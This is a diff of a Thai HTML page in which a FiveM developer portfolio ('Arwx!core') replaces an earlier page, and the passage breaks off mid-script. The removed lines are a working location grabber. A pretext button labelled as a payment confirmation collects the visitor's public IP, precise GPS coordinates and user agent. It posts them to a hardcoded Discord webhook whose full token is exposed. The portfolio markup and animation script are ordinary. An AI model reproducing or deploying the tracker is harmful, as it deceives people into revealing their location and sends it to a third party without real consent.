@@ -1,122 +1,703 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="th">
 <head>
-<meta charset="utf-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>ARWX ลงงาน</title>
-<style>
-  body{font-family:system-ui,sans-serif;background:#0f172a;color:#e5e7eb;padding:24px}
-  button{padding:12px 18px;border:0;border-radius:12px;background:#22c55e;cursor:pointer;font-size:16px}
-  pre{margin-top:16px;background:#020617;border-radius:12px;padding:14px;white-space:pre-wrap}
-  small{opacity:.8}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Arwx!core | FiveM Script Developer & Server Specialist</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;400;600&family=Orbitron:wght@400;700&family=Kanit:wght@300;400;600&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        arwx: {
+                            red: '#ff0033',
+                            dark: '#050505',
+                            gray: '#121212',
+                            light: '#e5e5e5'
+                        }
+                    },
+                    fontFamily: {
+                        mono: ['"Fira Code"', 'monospace'],
+                        display: ['"Orbitron"', 'sans-serif'],
+                        thai: ['"Kanit"', 'sans-serif'],
+                    },
+                    animation: {
+                        'pulse-slow': 'pulse 3s cubic-bezier(0.4, 0, 0.6, 1) infinite',
+                        'float': 'float 6s ease-in-out infinite',
+                        'spin-slow': 'spin 12s linear infinite',
+                    },
+                    keyframes: {
+                        float: {
+                            '0%, 100%': { transform: 'translateY(0)' },
+                            '50%': { transform: 'translateY(-20px)' },
+                        }
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        body {
+            background-color: #050505;
+            color: #e5e5e5;
+            overflow-x: hidden;
+            /* Enable Hardware Acceleration for the whole body */
+            transform: translate3d(0, 0, 0);
+        }
+        
+        /* Custom Scrollbar */
+        ::-webkit-scrollbar {
+            width: 8px;
+        }
+        ::-webkit-scrollbar-track {
+            background: #0a0a0a;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #ff0033;
+            border-radius: 4px;
+        }
+
+        /* Matrix Canvas */
+        #matrix-canvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: -1;
+            opacity: 0.15;
+            will-change: transform; /* Hint for browser optimization */
+            pointer-events: none; /* Disable mouse events to save resources */
+        }
+
+        /* Glitch Text */
+        .glitch {
+            position: relative;
+            will-change: clip;
+        }
+        .glitch::before,
+        .glitch::after {
+            content: attr(data-text);
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+        }
+        .glitch::before {
+            left: 2px;
+            text-shadow: -1px 0 #ff0033;
+            clip: rect(24px, 550px, 90px, 0);
+            animation: glitch-anim-2 3s infinite linear alternate-reverse;
+        }
+        .glitch::after {
+            left: -2px;
+            text-shadow: -1px 0 #00ffff;
+            clip: rect(85px, 550px, 140px, 0);
+            animation: glitch-anim 2.5s infinite linear alternate-reverse;
+        }
+        @keyframes glitch-anim {
+            0% { clip: rect(13px, 9999px, 88px, 0); }
+            20% { clip: rect(135px, 9999px, 13px, 0); }
+            40% { clip: rect(35px, 9999px, 126px, 0); }
+            60% { clip: rect(14px, 9999px, 66px, 0); }
+            80% { clip: rect(98px, 9999px, 35px, 0); }
+            100% { clip: rect(54px, 9999px, 11px, 0); }
+        }
+        @keyframes glitch-anim-2 {
+            0% { clip: rect(122px, 9999px, 9px, 0); }
+            20% { clip: rect(74px, 9999px, 143px, 0); }
+            40% { clip: rect(25px, 9999px, 5px, 0); }
+            60% { clip: rect(96px, 9999px, 131px, 0); }
+            80% { clip: rect(10px, 9999px, 88px, 0); }
+            100% { clip: rect(147px, 9999px, 49px, 0); }
+        }
+
+        /* Glassmorphism Card Optimized */
+        .glass-card {
+            background: rgba(20, 20, 20, 0.6);
+            /* Reduced blur radius slightly for performance */
+            backdrop-filter: blur(8px); 
+            -webkit-backdrop-filter: blur(8px);
+            border: 1px solid rgba(255, 0, 51, 0.1);
+            transition: transform 0.3s ease, box-shadow 0.3s ease, border-color 0.3s ease;
+            will-change: transform, box-shadow; /* Hint for browser optimization */
+        }
+        .glass-card:hover {
+            border-color: rgba(255, 0, 51, 0.5);
+            transform: translateY(-5px);
+            box-shadow: 0 10px 30px -10px rgba(255, 0, 51, 0.3);
+        }
+
+        .neon-text {
+            text-shadow: 0 0 5px #ff0033, 0 0 10px #ff0033;
+        }
+        
+        .cursor {
+            display: inline-block;
+            width: 10px;
+            background-color: #ff0033;
+            animation: blink 1s infinite;
+        }
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0; }
+        }
+
+        /* Reduced Motion Media Query */
+        @media (prefers-reduced-motion: reduce) {
+            * {
+                animation-duration: 0.01ms !important;
+                animation-iteration-count: 1 !important;
+                transition-duration: 0.01ms !important;
+                scroll-behavior: auto !important;
+            }
+        }
+    </style>
+    <link rel="icon" href="https://cdn.discordapp.com/attachments/1460601512719028245/1477747593705685112/ARWX2.png?ex=69abd1f1&is=69aa8071&hm=4a3d77e252461d8cfc5262609e281f0091cc9c08c73997253f9456363f39e622&" type="image/svg+xml">
 </head>
-<body>
+<body class="font-thai selection:bg-arwx-red selection:text-white">
 
-<h2>📍 ยินยันว่ายังไม่จ่าย</h2>
-<button id="btn">กดเพื่อส่ง</button>
-<pre id="out">ยังไม่ได้กด</pre>
+    <canvas id="matrix-canvas"></canvas>
 
-<script>
-const WEBHOOK_URL = "https://discord.com/api/webhooks/1452996074485710880/j3FV0207D74ogmrm6Y4_XepEzkrOk23XTQW70wAk0q21KeOGi9EMLYI4_dLY44yJCAaz"; // <- ใส่ webhook ของคุณ
+    <!-- Navigation -->
+    <nav class="fixed w-full z-50 bg-arwx-dark/80 backdrop-blur-md border-b border-arwx-red/20 will-change-transform">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="flex items-center justify-between h-20">
+                <div class="flex-shrink-0 group cursor-pointer">
+                    <span class="font-display text-3xl font-bold text-white tracking-wider group-hover:text-arwx-red transition-colors duration-300">ARWX<span class="text-arwx-red group-hover:text-white">!CORE</span></span>
+                </div>
+                <div class="hidden md:block">
+                    <div class="ml-10 flex items-baseline space-x-8">
+                        <a href="#home" class="text-gray-300 hover:text-arwx-red px-3 py-2 rounded-md text-sm font-medium transition-colors uppercase tracking-widest">Home</a>
+                        <a href="#about" class="text-gray-300 hover:text-arwx-red px-3 py-2 rounded-md text-sm font-medium transition-colors uppercase tracking-widest">About</a>
+                        <a href="#services" class="text-gray-300 hover:text-arwx-red px-3 py-2 rounded-md text-sm font-medium transition-colors uppercase tracking-widest">Services</a>
+                        <a href="#projects" class="text-gray-300 hover:text-arwx-red px-3 py-2 rounded-md text-sm font-medium transition-colors uppercase tracking-widest">Projects</a>
+                        <a href="#contact" class="bg-arwx-red/10 border border-arwx-red text-arwx-red hover:bg-arwx-red hover:text-white px-4 py-2 rounded-md text-sm font-bold transition-all uppercase tracking-widest">Contact</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </nav>
 
-const out = document.getElementById("out");
-const btn = document.getElementById("btn");
+    <!-- Hero Section -->
+    <section id="home" class="min-h-screen flex items-center justify-center relative overflow-hidden pt-20">
+        <div class="absolute inset-0 bg-gradient-to-b from-transparent via-arwx-dark/50 to-arwx-dark pointer-events-none"></div>
 
-function geoError(err){
-  let msg = "เกิดข้อผิดพลาด";
-  if (err.code === 1) msg = "❌ ผู้ใช้ไม่อนุญาตให้เข้าถึงตำแหน่ง (Permission denied)";
-  if (err.code === 2) msg = "❌ ไม่สามารถหาตำแหน่งได้ (Position unavailable)";
-  if (err.code === 3) msg = "❌ Timeout";
-  return msg;
-}
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 flex flex-col-reverse md:flex-row items-center relative z-10 gap-12">
+            <!-- Text Content -->
+            <div class="w-full md:w-1/2 text-center md:text-left">
+                <div class="inline-block px-4 py-1 border border-arwx-red/30 rounded-full bg-arwx-red/5 mb-6">
+                    <span class="text-arwx-red font-mono text-sm">FIVEM_DEV_MODE: ACTIVE</span>
+                </div>
+                <h1 class="text-5xl md:text-7xl font-bold text-white mb-4 font-display leading-tight">
+                    <span class="glitch block" data-text="ARWX!CORE">ARWX!CORE</span>
+                    <span class="text-2xl md:text-4xl text-gray-400 font-thai font-light mt-2">FiveM Developer Specialist</span>
+                </h1>
+                <div class="text-xl md:text-2xl text-gray-300 mb-8 h-8 font-mono">
+                    > <span id="typing-text" class="text-arwx-red font-bold"></span><span class="cursor">&nbsp;</span>
+                </div>
+                <p class="text-gray-400 mb-8 max-w-lg mx-auto md:mx-0 leading-relaxed font-thai text-lg">
+                    สร้างสรรค์ประสบการณ์ Roleplay เหนือระดับ ด้วยสคริปต์ Lua คุณภาพสูง, ระบบ NUI ที่ล้ำสมัย และการปรับแต่ง Server Performance ให้ลื่นไหล รองรับผู้เล่นจำนวนมาก
+                </p>
+                <div class="flex flex-col sm:flex-row gap-4 justify-center md:justify-start">
+                    <a href="#projects" class="group relative px-8 py-3 bg-arwx-red text-white font-bold rounded overflow-hidden transform transition-transform will-change-transform">
+                        <div class="absolute inset-0 w-full h-full bg-white/20 group-hover:translate-x-full transition-transform duration-500 ease-out -translate-x-full"></div>
+                        <span class="relative flex items-center justify-center gap-2">
+                            ดูผลงานสคริปต์ <i class="fas fa-arrow-right"></i>
+                        </span>
+                    </a>
+                    <a href="#contact" class="px-8 py-3 border border-gray-600 text-gray-300 font-bold rounded hover:border-arwx-red hover:text-arwx-red transition-all text-center transform transition-transform will-change-transform">
+                        ติดต่อทำเซิร์ฟเวอร์
+                    </a>
+                </div>
+                
+                <!-- Stats -->
+                <div class="grid grid-cols-3 gap-6 mt-12 border-t border-gray-800 pt-8">
+                    <div>
+                        <div class="text-3xl font-bold text-white font-display">100+</div>
+                        <div class="text-xs text-gray-500 uppercase tracking-wider mt-1">Scripts Created</div>
+                    </div>
+                    <div>
+                        <div class="text-3xl font-bold text-white font-display">4+</div>
+                        <div class="text-xs text-gray-500 uppercase tracking-wider mt-1">Years in FiveM</div>
+                    </div>
+                    <div>
+                        <div class="text-3xl font-bold text-white font-display">0.01ms</div>
+                        <div class="text-xs text-gray-500 uppercase tracking-wider mt-1">Optimization Goal</div>
+                    </div>
+                </div>
+            </div>
 
-async function getPublicIP(){
-  // ดึง IP สาธารณะ (IPv4/IPv6) — บางเครือข่ายจะได้ IPv6
-  // ถ้าโดนบล็อก ให้เปลี่ยน endpoint เป็นผู้ให้บริการอื่น
-  const r = await fetch("https://api.ipify.org?format=json", { cache: "no-store" });
-  if (!r.ok) throw new Error("ipify failed");
-  const j = await r.json();
-  return j.ip || "unknown";
-}
+            <!-- Image/Avatar -->
+            <div class="w-full md:w-1/2 flex justify-center relative">
+                <div class="relative w-80 h-80 md:w-[500px] md:h-[500px]">
+                    <!-- Rotating Circles -->
+                    <div class="absolute inset-0 border border-arwx-red/20 rounded-full animate-spin-slow will-change-transform"></div>
+                    <div class="absolute inset-4 border border-arwx-red/10 rounded-full animate-spin-slow will-change-transform" style="animation-direction: reverse;"></div>
+                    
+                    <!-- Glow -->
+                    <div class="absolute inset-0 bg-arwx-red rounded-full blur-[100px] opacity-20 animate-pulse-slow"></div>
+                    
+                    <!-- Main Image -->
+                    <div class="relative w-full h-full rounded-2xl overflow-hidden border border-arwx-red/30 glass-card animate-float p-2 will-change-transform">
+                        <div class="w-full h-full rounded-xl overflow-hidden relative">
+                             <img src="https://cdn.discordapp.com/attachments/1352385698031992961/1479485511973343372/IMG_20260214_131927.png?ex=69ac35c1&is=69aae441&hm=1c6f1b12b7e15c730daf3a7af562d41e0a2b61c2d9dd4f8e501293c907f9c1a1&" alt="Arwx!core Avatar" class="w-full h-full object-cover">
+                            <!-- Tech Overlay -->
+                            <div class="absolute bottom-0 left-0 right-0 bg-gradient-to-t from-black/90 to-transparent p-6">
+                                <div class="font-mono text-xs text-arwx-red mb-1">SERVER: CONNECTED</div>
+                                <div class="font-display text-white font-bold">ARWX!CORE SYSTEM</div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
 
-function getGeo(){
-  return new Promise((resolve, reject) => {
-    if (!navigator.geolocation) return reject(new Error("Geolocation not supported"));
-    navigator.geolocation.getCurrentPosition(resolve, reject, {
-      enableHighAccuracy: true,
-      timeout: 15000,
-      maximumAge: 0
-    });
-  });
-}
+    <!-- About & Skills Section -->
+    <section id="about" class="py-24 bg-arwx-gray/50 relative">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="text-center mb-16">
+                <span class="text-arwx-red font-mono text-sm tracking-widest uppercase">Identity</span>
+                <h2 class="text-4xl font-display font-bold text-white mt-2 mb-4">About <span class="text-arwx-red">Me</span></h2>
+                <p class="text-gray-400 font-thai max-w-2xl mx-auto">รู้จักตัวตนและทักษะความเชี่ยวชาญด้าน FiveM Development</p>
+            </div>
 
-async function sendToDiscord(payload){
-  const r = await fetch(WEBHOOK_URL, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify(payload)
-  });
-  if (!r.ok) throw new Error("Webhook send failed");
-}
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-12 items-center">
+                <!-- Code Editor Look -->
+                <div class="w-full">
+                    <div class="bg-[#1e1e1e] rounded-lg shadow-2xl overflow-hidden border border-gray-800 transform hover:scale-[1.01] transition-transform duration-300">
+                        <div class="bg-[#2d2d2d] px-4 py-2 flex items-center gap-2 border-b border-gray-700">
+                            <div class="w-3 h-3 rounded-full bg-red-500"></div>
+                            <div class="w-3 h-3 rounded-full bg-yellow-500"></div>
+                            <div class="w-3 h-3 rounded-full bg-green-500"></div>
+                            <span class="ml-2 text-xs text-gray-400 font-mono">client.lua</span>
+                        </div>
+                        <div class="p-6 overflow-x-auto h-80">
+                            <pre class="text-sm font-mono leading-relaxed"><code id="typewriter-code"></code></pre>
+                        </div>
+                    </div>
+                </div>
 
-btn.addEventListener("click", async () => {
-  try {
-    out.textContent = "⏳ กำลังดึง IP + ตำแหน่ง...";
-    btn.disabled = true;
+                <!-- Text Content -->
+                <div>
+                    <h3 class="text-2xl font-bold text-white mb-4 font-thai">ผมคือใคร?</h3>
+                    <p class="text-gray-400 mb-6 font-thai leading-relaxed">
+                        สวัสดีครับ! ผมคือ <strong class="text-white">Arwx!core</strong> นักพัฒนาที่มีความเชี่ยวชาญเฉพาะด้านในวงการ FiveM Roleplay 
+                        ผมเริ่มต้นจากการเป็นผู้เล่นที่หลงใหลในระบบเกม จนก้าวมาเป็นผู้สร้างสรรค์ระบบที่ซับซ้อน 
+                        ผมเข้าใจทั้งในมุมมองของผู้เล่นและเจ้าของเซิร์ฟเวอร์ มุ่งเน้นการเขียนโค้ดที่สะอาด (Clean Code) และประหยัดทรัพยากร (Optimization)
+                    </p>
+                    
+                    <div class="space-y-4">
+                        <!-- Skill Bar -->
+                        <div>
+                            <div class="flex justify-between text-sm mb-1">
+                                <span class="text-white font-mono">Lua Scripting (ESX/QBCore)</span>
+                                <span class="text-arwx-red font-mono">98%</span>
+                            </div>
+                            <div class="w-full bg-gray-800 h-2 rounded-full overflow-hidden">
+                                <div class="bg-arwx-red h-full rounded-full" style="width: 98%"></div>
+                            </div>
+                        </div>
+                        <div>
+                            <div class="flex justify-between text-sm mb-1">
+                                <span class="text-white font-mono">NUI Design (HTML/CSS/JS/React)</span>
+                                <span class="text-arwx-red font-mono">90%</span>
+                            </div>
+                            <div class="w-full bg-gray-800 h-2 rounded-full overflow-hidden">
+                                <div class="bg-arwx-red h-full rounded-full" style="width: 90%"></div>
+                            </div>
+                        </div>
+                        <div>
+                            <div class="flex justify-between text-sm mb-1">
+                                <span class="text-white font-mono">Database (MySQL/OxMySQL)</span>
+                                <span class="text-arwx-red font-mono">85%</span>
+                            </div>
+                            <div class="w-full bg-gray-800 h-2 rounded-full overflow-hidden">
+                                <div class="bg-arwx-red h-full rounded-full" style="width: 85%"></div>
+                            </div>
+                        </div>
+                        <div>
+                            <div class="flex justify-between text-sm mb-1">
+                                <span class="text-white font-mono">Server Optimization (Resmon/OneSync)</span>
+                                <span class="text-arwx-red font-mono">95%</span>
+                            </div>
+                            <div class="w-full bg-gray-800 h-2 rounded-full overflow-hidden">
+                                <div class="bg-arwx-red h-full rounded-full" style="width: 95%"></div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
 
-    // ดึงพร้อมกัน
-    const [ip, pos] = await Promise.all([
-      getPublicIP().catch(() => "unknown"),
-      getGeo()
-    ]);
+    <!-- Services Section -->
+    <section id="services" class="py-24 relative">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="text-center mb-16">
+                <span class="text-arwx-red font-mono text-sm tracking-widest uppercase">What I Do</span>
+                <h2 class="text-4xl font-display font-bold text-white mt-2 mb-4">My <span class="text-arwx-red">Services</span></h2>
+                <p class="text-gray-400 font-thai max-w-2xl mx-auto">บริการด้าน FiveM ครบวงจร</p>
+            </div>
 
-    const { latitude, longitude, accuracy } = pos.coords;
-    const time = new Date().toLocaleString("th-TH");
-    const mapUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
-    const ua = navigator.userAgent;
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
+                <!-- Service 1 -->
+                <div class="glass-card p-8 rounded-xl text-center group">
+                    <div class="w-16 h-16 bg-arwx-red/10 rounded-full flex items-center justify-center mx-auto mb-6 group-hover:bg-arwx-red transition-colors duration-300 transform transition-transform will-change-transform">
+                        <i class="fas fa-gamepad text-2xl text-arwx-red group-hover:text-white"></i>
+                    </div>
+                    <h3 class="text-xl font-bold text-white mb-3 font-thai">Custom Script Development</h3>
+                    <p class="text-gray-400 text-sm font-thai leading-relaxed">
+                        รับเขียนระบบตามสั่งทุกรูปแบบ ไม่ว่าจะเป็นระบบงาน, ระบบแก๊ง, ระบบปล้น, หรือระบบ Inventory ที่ซับซ้อน รองรับทั้ง ESX และ QBCore
+                    </p>
+                    <div class="flex justify-center items-center gap-2 mt-4">
+                        <span class="text-arwx-red font-mono text-sm tracking-widest uppercase">ESX</span>
+                        <span class="text-arwx-red font-mono text-sm tracking-widest uppercase">QBCore</span>
+                    </div>
+                </div>
 
-    const payload = {
-      username: "Web Tracker",
-      embeds: [{
-        title: "📍 ที่อยู่ ",
-        color: 0x22c55e,
-        fields: [
-          { name: "🕒 เวลา", value: time, inline: false },
-          { name: "🌐 IP (Public)", value: `\`${ip}\``, inline: true },
-          { name: "📌 Latitude", value: `\`${latitude}\``, inline: true },
-          { name: "📌 Longitude", value: `\`${longitude}\``, inline: true },
-          { name: "🎯 Accuracy", value: `${Math.round(accuracy)} เมตร`, inline: true },
-          { name: "🗺️ Google Maps", value: `[เปิดแผนที่](${mapUrl})`, inline: false },
-          { name: "🧾 User-Agent", value: `\`${ua.slice(0, 900)}\``, inline: false }
-        ],
-        footer: { text: "Web Location Reporter" }
-      }]
-    };
+                <!-- Service 2 -->
+                <div class="glass-card p-8 rounded-xl text-center group">
+                    <div class="w-16 h-16 bg-arwx-red/10 rounded-full flex items-center justify-center mx-auto mb-6 group-hover:bg-arwx-red transition-colors duration-300 transform transition-transform will-change-transform">
+                        <i class="fas fa-desktop text-2xl text-arwx-red group-hover:text-white"></i>
+                    </div>
+                    <h3 class="text-xl font-bold text-white mb-3 font-thai">NUI & Interface Design</h3>
+                    <p class="text-gray-400 text-sm font-thai leading-relaxed">
+                        ออกแบบหน้าต่าง UI ในเกมให้สวยงาม ทันสมัย ใช้งานง่าย (UX/UI) เขียนด้วย React, Vue หรือ HTML/CSS เพียวๆ เพื่อประสิทธิภาพสูงสุด
+                    </p>
+                    <div class="flex justify-center items-center gap-2 mt-4">
+                        <span class="text-arwx-red font-mono text-sm tracking-widest uppercase">React</span>
+                        <span class="text-arwx-red font-mono text-sm tracking-widest uppercase">Vue</span>
+                        <span class="text-arwx-red font-mono text-sm tracking-widest uppercase">HTML/CSS</span>
+                    </div>
+                </div>
 
-    await sendToDiscord(payload);
+                <!-- Service 3 -->
+                <div class="glass-card p-8 rounded-xl text-center group">
+                    <div class="w-16 h-16 bg-arwx-red/10 rounded-full flex items-center justify-center mx-auto mb-6 group-hover:bg-arwx-red transition-colors duration-300 transform transition-transform will-change-transform">
+                        <i class="fas fa-server text-2xl text-arwx-red group-hover:text-white"></i>
+                    </div>
+                    <h3 class="text-xl font-bold text-white mb-3 font-thai">Server Optimization</h3>
+                    <p class="text-gray-400 text-sm font-thai leading-relaxed">
+                        แก้ปัญหาเซิร์ฟหน่วง แลค FPS ตก ปรับจูนสคริปต์ให้กินทรัพยากรน้อยที่สุด (Low Resmon) และแก้ไขบัคต่างๆ ให้เซิร์ฟเวอร์เสถียร
+                    </p>
+                    <div class="flex justify-center items-center gap-2 mt-4">
+                        <span class="text-arwx-red font-mono text-sm tracking-widest uppercase">Resmon: 95%</span>
+                        <span class="text-arwx-red font-mono text-sm tracking-widest uppercase">OneSync: 98%</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
 
-    out.textContent =
-      "✅ ส่งไป Discord แล้ว\n\n" +
-      `เวลา: ${time}\n` +
-      `IP: ${ip}\n` +
-      `Lat: ${latitude}\n` +
-      `Lon: ${longitude}\n` +
-      `Accuracy: ${Math.round(accuracy)}m\n` +
-      mapUrl;
+    <!-- Projects Section -->
+    <section id="projects" class="py-24 bg-arwx-gray/30">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="flex flex-col md:flex-row justify-between items-end mb-12">
+                <div>
+                    <span class="text-arwx-red font-mono text-sm tracking-widest uppercase">Portfolio</span>
+                    <h2 class="text-4xl font-display font-bold text-white mt-2">Selected <span class="text-arwx-red">Works</span></h2>
+                </div>
+                <a href="#" class="text-gray-400 hover:text-white flex items-center gap-2 mt-4 md:mt-0 font-thai">
+                    ดูผลงานทั้งหมด <i class="fas fa-arrow-right"></i>
+                </a>
+            </div>
 
-  } catch (e) {
-    // แยกเคส location error ให้ชัด
-    if (e && typeof e.code === "number") {
-      out.textContent = geoError(e);
-    } else {
-      out.textContent = "❌ ส่งไม่สำเร็จ: " + (e?.message || "unknown error");
-    }
-  } finally {
-    btn.disabled = false;
-  }
-});
-</script>
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
+                <!-- Project 1 -->
+                <div class="group relative overflow-hidden rounded-xl h-80 bg-gray-800 transform transition-transform duration-300 hover:scale-[1.02] will-change-transform">
+                    <div class="absolute inset-0 bg-gradient-to-t from-black via-black/50 to-transparent z-10"></div>
+                    <!-- Placeholder Image (Using CSS Pattern) -->
+                    <div class="absolute inset-0 bg-[radial-gradient(circle_at_center,_var(--tw-gradient-stops))] from-gray-700 via-gray-900 to-black opacity-50 group-hover:scale-110 transition-transform duration-700 will-change-transform"></div>
+                    <div class="absolute inset-0 flex items-center justify-center text-gray-700 font-display text-4xl font-bold opacity-20">SYSTEM</div>
+                    
+                    <div class="absolute bottom-0 left-0 p-6 z-20 w-full translate-y-4 group-hover:translate-y-0 transition-transform duration-300 will-change-transform">
+                        <div class="text-arwx-red text-xs font-mono mb-2">LUA / SYSTEM</div>
+                        <h3 class="text-xl font-bold text-white mb-2">Advanced Gang System</h3>
+                        <p class="text-gray-400 text-sm opacity-0 group-hover:opacity-100 transition-opacity duration-300 font-thai">
+                            ระบบแก๊งยึดพื้นที่ คลังเก็บของกลาง และระบบสงครามเต็มรูปแบบ
+                        </p>
+                    </div>
+                </div>
 
+                <!-- Project 2 -->
+                <div class="group relative overflow-hidden rounded-xl h-80 bg-gray-800 transform transition-transform duration-300 hover:scale-[1.02] will-change-transform">
+                    <div class="absolute inset-0 bg-gradient-to-t from-black via-black/50 to-transparent z-10"></div>
+                    <div class="absolute inset-0 bg-[radial-gradient(circle_at_center,_var(--tw-gradient-stops))] from-gray-700 via-gray-900 to-black opacity-50 group-hover:scale-110 transition-transform duration-700 will-change-transform"></div>
+                    <div class="absolute inset-0 flex items-center justify-center text-gray-700 font-display text-4xl font-bold opacity-20">NUI</div>
+                    
+                    <div class="absolute bottom-0 left-0 p-6 z-20 w-full translate-y-4 group-hover:translate-y-0 transition-transform duration-300 will-change-transform">
+                        <div class="text-arwx-red text-xs font-mono mb-2">REACT / NUI</div>
+                        <h3 class="text-xl font-bold text-white mb-2">Modern Vehicle HUD</h3>
+                        <p class="text-gray-400 text-sm opacity-0 group-hover:opacity-100 transition-opacity duration-300 font-thai">
+                            หน้าปัดรถยนต์ดีไซน์ล้ำสมัย บอกสถานะครบถ้วน ปรับแต่งสีได้
+                        </p>
+                    </div>
+                </div>
+
+                <!-- Project 3 -->
+                <div class="group relative overflow-hidden rounded-xl h-80 bg-gray-800 transform transition-transform duration-300 hover:scale-[1.02] will-change-transform">
+                    <div class="absolute inset-0 bg-gradient-to-t from-black via-black/50 to-transparent z-10"></div>
+                    <div class="absolute inset-0 bg-[radial-gradient(circle_at_center,_var(--tw-gradient-stops))] from-gray-700 via-gray-900 to-black opacity-50 group-hover:scale-110 transition-transform duration-700 will-change-transform"></div>
+                    <div class="absolute inset-0 flex items-center justify-center text-gray-700 font-display text-4xl font-bold opacity-20">INV</div>
+                    
+                    <div class="absolute bottom-0 left-0 p-6 z-20 w-full translate-y-4 group-hover:translate-y-0 transition-transform duration-300 will-change-transform">
+                        <div class="text-arwx-red text-xs font-mono mb-2">LUA / UI</div>
+                        <h3 class="text-xl font-bold text-white mb-2">Premium Inventory</h3>
+                        <p class="text-gray-400 text-sm opacity-0 group-hover:opacity-100 transition-opacity duration-300 font-thai">
+                            ช่องเก็บของสวยงาม รองรับน้ำหนัก ระบบ Crafting และร้านค้าในตัว
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer id="contact" class="bg-black py-16 border-t border-arwx-red/20 relative overflow-hidden">
+        <!-- Background Glow -->
+        <div class="absolute top-0 left-1/2 -translate-x-1/2 w-full max-w-lg h-1 bg-arwx-red shadow-[0_0_100px_rgba(255,0,51,0.5)]"></div>
+
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 text-center relative z-10">
+            <h2 class="text-3xl font-display font-bold text-white mb-6">Let's Build Your Server</h2>
+            <p class="text-gray-400 mb-10 font-thai text-lg">ต้องการสคริปต์คุณภาพ หรือหา Dev ดูแลเซิร์ฟเวอร์? ทักมาคุยรายละเอียดกันได้เลย</p>
+            
+            <div class="flex justify-center space-x-8 mb-12">
+                <a href="#" class="group p-4 rounded-full bg-gray-900 border border-gray-800 hover:border-arwx-red hover:bg-arwx-red/10 transition-all duration-300">
+                    <i class="fab fa-github text-2xl text-gray-400 group-hover:text-arwx-red"></i>
+                </a>
+            
+                <a href="#" class="group p-4 rounded-full bg-gray-900 border border-gray-800 hover:border-arwx-red hover:bg-arwx-red/10 transition-all duration-300">
+                    <i class="fab fa-discord text-2xl text-gray-400 group-hover:text-arwx-red"></i>
+                </a>
+                <a href="#" class="group p-4 rounded-full bg-gray-900 border border-gray-800 hover:border-arwx-red hover:bg-arwx-red/10 transition-all duration-300">
+                    <i class="fab fa-twitter text-2xl text-gray-400 group-hover:text-arwx-red"></i>
+                </a>
+                <a href="#" class="group p-4 rounded-full bg-gray-900 border border-gray-800 hover:border-arwx-red hover:bg-arwx-red/10 transition-all duration-300">
+                    <i class="fas fa-envelope text-2xl text-gray-400 group-hover:text-arwx-red"></i>
+                </a>
+            </div>
+            
+
+            <div class="text-gray-600 text-sm font-mono">
+                <p>&copy; 2024 ARWX!CORE. All rights reserved.</p>
+                <p class="mt-2 text-xs">Designed & Developed by Arwx!core</p>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // Matrix Effect Optimized (Debounce + RAF + FPS Cap)
+        const canvas = document.getElementById('matrix-canvas');
+        const ctx = canvas.getContext('2d', { alpha: true }); // Need alpha for transparency
+
+        // Debounce resize
+        let resizeTimeout;
+        const setCanvasSize = () => {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+            // Recalculate columns on resize
+            const newColumns = Math.ceil(canvas.width / fontSize);
+            // Adjust drops array if needed, but for simplicity, we can just reset or extend
+            if (newColumns > drops.length) {
+                for (let i = drops.length; i < newColumns; i++) {
+                    drops[i] = Math.random() * -100; // Start off screen
+                }
+            }
+        };
+
+        window.addEventListener('resize', () => {
+            clearTimeout(resizeTimeout);
+            resizeTimeout = setTimeout(setCanvasSize, 200); // 200ms debounce
+        });
+
+        // Initialize size
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+
+        const chars = "ARWX!CORE010101XYZA";
+        const charArray = chars.split("");
+        const fontSize = 14;
+        let columns = Math.ceil(canvas.width / fontSize);
+        const drops = [];
+
+        for (let i = 0; i < columns; i++) {
+            drops[i] = Math.random() * -100; // Random start positions
+        }
+
+        // Animation Loop with FPS control
+        let lastTime = 0;
+        const fps = 24; // Limit to 24 FPS to reduce CPU/GPU usage
+        const interval = 1000 / fps;
+
+        function drawMatrix(currentTime) {
+            requestAnimationFrame(drawMatrix);
+
+            const deltaTime = currentTime - lastTime;
+            
+            if (deltaTime > interval) {
+                // Adjust for time elapsed, but don't skip frames too aggressively for this effect
+                lastTime = currentTime - (deltaTime % interval);
+
+                ctx.fillStyle = "rgba(5, 5, 5, 0.05)";
+                ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+                ctx.fillStyle = "#ff0033"; // Red Matrix
+                ctx.font = fontSize + "px monospace";
+
